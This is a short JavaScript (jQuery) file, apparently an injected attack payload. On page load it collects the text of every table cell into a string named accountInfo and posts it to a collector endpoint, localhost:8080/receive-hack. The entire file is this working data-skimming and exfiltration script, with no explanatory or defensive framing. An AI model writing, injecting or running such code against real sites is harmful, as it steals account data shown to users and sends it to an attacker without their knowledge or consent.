$(document).ready(function() {
	var accountInfo = "";
	$("table").children("tbody").children("tr").each(function() {
		$(this).children("td").each(function() {
			accountInfo = accountInfo + ";" + $(this).text();
		});

	});
	console.log(accountInfo);
	$.post("http://localhost:8080/receive-hack", {
		accountInfo : accountInfo
	}, function(data, status) {
		console.log("Data: " + data + " Status: " + status);
	});
});
